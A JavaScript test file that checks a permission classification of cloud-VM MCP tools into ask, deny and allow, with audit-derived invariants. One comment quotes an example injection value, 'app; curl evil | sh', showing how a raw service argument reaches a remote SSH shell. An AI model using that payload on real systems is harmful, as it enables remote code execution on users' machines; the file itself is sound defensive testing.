// Golden classification tests — ADR-004 Confirmation layer 1: every mutating tool must be
// covered by the emitted permission template; a live tool unknown to the classifier fails.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';

const require = createRequire(import.meta.url);
const {
  loadClassification, loadSnapshot, namesByPermission, permissionRules, coverageGaps, SERVER_PREFIXES,
} = require('../src/classification.js');

const cls = loadClassification();
const snap = loadSnapshot();

test('every snapshot tool is classified, and nothing extra', () => {
  const snapNames = snap.tools.map((t) => t.name).sort();
  const clsNames = Object.keys(cls.tools).sort();
  assert.deepEqual(clsNames, snapNames);
  assert.equal(snapNames.length, 144);
});

test('counts are the reviewed golden split: 65 ask / 2 deny / 77 allow', () => {
  assert.deepEqual(cls.counts, { ask: 65, deny: 2, allow: 77 });
  const by = namesByPermission(cls);
  assert.equal(by.ask.length, 65);
  assert.equal(by.deny.length, 2);
  assert.equal(by.allow.length, 77);
});

// --- Invariant of the 2026-08-10 behaviour re-audit (cross-model QE HIGH finding) ---
// stack_status ADVANCES a planned/running job server-side: handleStackStatus
// (tools_stack.go:451) calls advance() (:479-484), which starts pending steps via
// s.callTool (:220) — invoking the paid create tools with no confirmation.
// LIVE-REPRODUCED: one stack_status call moved a planned job planned→running and
// attempted `provision` (stopped only at AUTH_REQUIRED). If this ever flips back to
// allow, the fully-frictionless chain stack_plan→stack_status provisions a billable
// stack with ZERO permission prompts — defeating the ADR-004 brake.
test('stack_status is ASK — it advances jobs and invokes paid create tools (tools_stack.go:479→:220)', () => {
  assert.equal(cls.tools.stack_status.permission, 'ask');
  assert.equal(cls.tools.stack_status.effect, 'mutating');
  const rules = permissionRules(cls);
  assert.ok(rules.ask.includes('mcp__cloudru-vm__stack_status'));
  assert.ok(rules.ask.includes('mcp__cloudru_vm__stack_status'));
  assert.ok(!rules.allow.some((r) => r.endsWith('__stack_status')), 'stack_status must never be emitted as allow');
});

test('the stack chain: only the pure plan is allow — every advancing/applying/destroying step is ask', () => {
  assert.equal(cls.tools.stack_plan.permission, 'allow'); // verified: persists a LOCAL job file only, creates nothing
  for (const name of ['stack_apply', 'stack_status', 'stack_destroy']) {
    assert.equal(cls.tools[name].permission, 'ask', name);
  }
});

// --- Invariant of the 2026-08-10 shell-reach re-audit (AM-2, cross-model QE HIGH) ---
// The classification method has a SECOND hazard axis: a tool is allow ONLY if it does NOT
// pass a user-controlled arg into a remote shell. `logs` does — handleLogs (tools.go:1758)
// hands the user `service` arg to engine.Logs, which concatenates it RAW into a remote
// `docker compose logs <service>` (engine/logs.go:61) run via SSH CombinedOutput
// (internal/deploy/ssh.go:117). service="app; curl evil | sh" ⇒ arbitrary RCE on the
// user's VM. If this flips back to allow the injection sits behind a SILENT allow — a
// zero-prompt command-injection path defeating the ADR-004 brake.
test('logs is ASK — it concatenates a user-controlled service arg into a remote shell (logs.go:61 → ssh.go:117)', () => {
  assert.equal(cls.tools.logs.permission, 'ask');
  const rules = permissionRules(cls);
  assert.ok(rules.ask.includes('mcp__cloudru-vm__logs'));
  assert.ok(rules.ask.includes('mcp__cloudru_vm__logs'));
  assert.ok(!rules.allow.some((r) => r.endsWith('__logs')), 'logs must never be emitted as allow');
});

// The method doc (the $comment) must keep documenting BOTH hazard axes — losing the
// shell-reach axis silently is the exact regression that let `logs` sit in allow. This is
// a layer-1 guard on the METHOD, not just the instance.
test('the classification method doc documents the shell-reach hazard axis and the engine-injection flag', () => {
  assert.match(cls.$comment, /shell-reach/i, 'method doc must name the shell-reach hazard axis');
  assert.match(cls.$comment, /user-controlled argument into a shell/i);
  assert.match(cls.$comment, /shell-escape opts\.Service/i, 'method doc must record the flagged engine injection');
});

// No allow tool may reach a shell: every allow entry must be free of the shell-reach
// markers the audit tracks. A future allow entry whose `why` admits a shell-reach (Exec /
// CombinedOutput / raw command concat) is a classification error and goes red here.
test('no allow entry admits a shell-reach in its why (the AM-2 axis is applied to every allow)', () => {
  for (const [name, c] of Object.entries(cls.tools)) {
    if (c.permission !== 'allow') continue;
    assert.doesNotMatch(c.why, /shell-reach|CombinedOutput|Deployer\.Exec|cmd \+=/i,
      `${name}: an allow tool must not admit a shell-reach in its why`);
  }
});

// Method invariant: "no confirmed prop in the schema" is a SHAPE check and is NEVER
// sufficient for allow — that heuristic is exactly what mis-filed stack_status as
// read-only. Every allow entry must carry behaviour-audit evidence citing the engine
// handler (file:line) that proves the handler is genuinely read-only.
test('every allow entry cites a handler behaviour audit, not the schema-shape heuristic', () => {
  for (const [name, c] of Object.entries(cls.tools)) {
    if (c.permission !== 'allow') continue;
    assert.match(c.why, /behaviour-audited/, `${name}: allow requires behaviour-audit evidence in why`);
    assert.match(c.why, /\.go:\d+/, `${name}: allow why must cite the engine handler file:line`);
    assert.ok(!/no confirmed prop/.test(c.why), `${name}: shape heuristic must not justify allow`);
  }
});

test('the two plaintext-secret reads are DENY (ADR-004 §1)', () => {
  const by = namesByPermission(cls);
  assert.deepEqual(by.deny.sort(), ['cert_private_key', 'secret_value']);
});

test('the MEASURED ungated mutators (05 §2.2) are all ASK — the engine gate does not cover them', () => {
  for (const name of ['deploy', 'provision', 'vm_exec', 'ca_start', 'ca_stop', 'cert_issue_le', 'cert_import', 'cert_renew', 's3_put', 's3_bucket_create']) {
    assert.equal(cls.tools[name].permission, 'ask', `${name} must be ask`);
    assert.equal(cls.tools[name].effect, 'mutating');
  }
});

test('every tool whose schema declares `confirmed` is ask or deny — never allow', () => {
  for (const t of snap.tools) {
    if (!t.gated) continue;
    assert.notEqual(cls.tools[t.name].permission, 'allow', `${t.name} is engine-gated (confirmed prop) but classified allow`);
  }
});

test('read-only recon stays frictionless: vm_list, billing_*, deploy_plan are allow', () => {
  for (const name of ['vm_list', 'billing_balance', 'billing_consumption', 'deploy_plan', 'list_zones', 'status']) {
    assert.equal(cls.tools[name].permission, 'allow', name);
  }
});

test('permissionRules expands every name in BOTH prefix spellings (unverified normalization, deny-by-default)', () => {
  const rules = permissionRules(cls);
  assert.equal(SERVER_PREFIXES.length, 2);
  assert.equal(rules.ask.length, 65 * 2);
  assert.equal(rules.deny.length, 2 * 2);
  assert.equal(rules.allow.length, 77 * 2);
  assert.ok(rules.ask.includes('mcp__cloudru-vm__deploy'));
  assert.ok(rules.ask.includes('mcp__cloudru_vm__deploy'));
  assert.ok(rules.deny.includes('mcp__cloudru-vm__secret_value'));
  assert.ok(rules.deny.includes('mcp__cloudru_vm__secret_value'));
});

test('coverageGaps: an unknown live tool is a drift finding, never silently allowed', () => {
  const live = [...snap.tools.map((t) => t.name), 'vm_teleport'];
  const gaps = coverageGaps(live, cls);
  assert.deepEqual(gaps.unknown, ['vm_teleport']);
  assert.deepEqual(gaps.missing, []);
});

test('coverageGaps: a classified tool missing from the live list is reported the other way', () => {
  const live = snap.tools.map((t) => t.name).filter((n) => n !== 'deploy');
  const gaps = coverageGaps(live, cls);
  assert.deepEqual(gaps.missing, ['deploy']);
});
